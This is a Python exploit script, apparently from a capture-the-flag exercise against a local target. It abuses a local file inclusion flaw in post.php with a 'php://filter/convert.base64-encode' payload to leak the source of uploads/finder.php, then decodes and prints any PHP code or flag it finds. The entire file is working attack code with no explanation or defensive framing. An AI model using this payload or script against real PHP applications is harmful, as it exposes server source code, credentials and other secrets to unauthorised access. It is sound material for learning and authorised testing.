import requests
import base64

base_url = "http://127.0.0.1:32891"

print("[+] Trying to read finder.php source code using PHP filter...")

# Read the source of finder.php without executing it
payload = "php://filter/convert.base64-encode/resource=uploads/finder.php"

resp = requests.get(f"{base_url}/post.php", params={'id': payload})

print(f"Status: {resp.status_code} | Length: {len(resp.text)}")

# Look for base64 content in the response
import re
# The base64 should be in the response somewhere
lines = resp.text.split('\n')

for i, line in enumerate(lines):
    # Look for long base64 strings
    b64_matches = re.findall(r'[A-Za-z0-9+/]{100,}={0,2}', line)
    if b64_matches:
        print(f"\n[+] Found base64 at line {i}:")
        for match in b64_matches:
            try:
                decoded = base64.b64decode(match).decode('utf-8', errors='ignore')
                if '<?php' in decoded or 'FLAG' in decoded or 'cat' in decoded:
                    print(f"\n[!!!] Decoded PHP source:")
                    print(decoded)
                    print("\n" + "="*80)
            except Exception as e:
                pass

# Also try without the .php extension
print("\n[+] Trying uploads/finder with base64...")
payload2 = "php://filter/convert.base64-encode/resource=uploads/finder"

resp2 = requests.get(f"{base_url}/post.php", params={'id': payload2})
print(f"Status: {resp2.status_code} | Length: {len(resp2.text)}")

# Search for base64 in this response too
b64_pattern = r'[A-Za-z0-9+/]{50,}={0,2}'
all_matches = re.findall(b64_pattern, resp2.text)

print(f"\nFound {len(all_matches)} potential base64 strings")

for i, match in enumerate(all_matches[:10]):  # Check first 10
    if len(match) > 100:  # Only check substantial strings
        try:
            decoded = base64.b64decode(match).decode('utf-8', errors='ignore')
            if '<?php' in decoded:
                print(f"\n[!!!] Found PHP code (match {i}):")
                print(decoded)
        except:
            pass

